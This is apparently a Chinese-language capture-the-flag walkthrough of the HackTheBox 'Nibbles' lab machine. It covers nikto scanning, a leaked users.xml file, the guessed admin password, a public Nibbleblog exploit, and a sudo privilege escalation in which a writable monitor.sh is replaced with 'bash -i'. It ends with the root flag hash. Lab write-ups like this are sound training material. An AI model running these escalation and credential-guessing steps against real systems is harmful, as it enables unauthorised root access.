# Nibbles

- victim
  - 10.10.10.75
- local
  - 10.10.14.19

---

## 扫描结果分析

简单扫描只有22和80，先看看Web吧，重度扫描也一样

## Web服务分析

根据HTML里的注释，到`/nibbleblog/`，一个基于Nibbleblog的博客，用nikto进一步扫描一下

```bash
nikto --url http://10.10.10.75/nibbleblog/
```

```
Cookie PHPSESSID created without the httponly flag
```

简单一看，存在任意文件流量，文件夹index可用

EDB上也找到两个EXP，都试试吧

下面是一个重要的泄露文件

- http://10.10.10.75/nibbleblog/content/private/users.xml

通过它可以找到用户名为admin

密码是nibbles，通过手工猜测，或者cewl等工具猜测后爆破

根据EDB上找到的EXP，进行攻击，相关设置见res下的图片

成功得到user shell

```shell
download /home/nibbler/user.txt
```

## 提权

```shell
download /home/nibbler/personal.zip
```

LinEnum.sh

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```bash
mkdir /home/nibbler/personal/stuff/ -p
cd /home/nibbler/personal/stuff/
echo "bash -i" > monitor.sh
chmod +x monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

稍等一会，getshell √

root.txt

```
b6d745c0dfb6457c55591efc898ef88c
```

